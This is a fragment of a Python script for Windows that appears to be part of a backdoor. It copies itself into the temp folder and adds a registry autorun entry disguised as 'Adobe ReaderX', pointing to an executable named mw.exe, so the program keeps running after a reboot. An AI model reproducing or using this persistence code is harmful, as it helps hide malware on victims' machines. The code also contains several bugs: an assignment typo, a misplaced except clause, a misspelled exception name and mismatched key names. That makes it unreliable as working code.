import sys, base64, os, socket, subprocess
from _winreg import *

def autorun(tempdir, file_name, run):
    #copy the .exe to the %TEMP%
    os.system('copy %s %s'%(file_name, tempdir))

    #queries windows registry for the autorun key value
    #store the key values in runkey array
    key - OpenKey(HKEY_LOCAL_MACHINE,run)
    runkey=[]
    try:
        i=0
        while True:
            subkey = EnumValue(key, i)
            runkey.append(subkey[0])
            i+=1
        except WindowsError:
            pass

        #if the autorun key "Adobe ReaderX" isn't set this will et the key

        if 'Adobe ReaderX' not in runkey:
            try:
                key=OpenKey(HKEY_LOCAL_MACHINE,run,0,KEY_ALL_ACCESS)
                SetValueEx(key,'Adobe_ReaderX',0,REG_SZ,r"%TEMP%mw.exe")
                key.Close()
            except Windowserror:
                pass


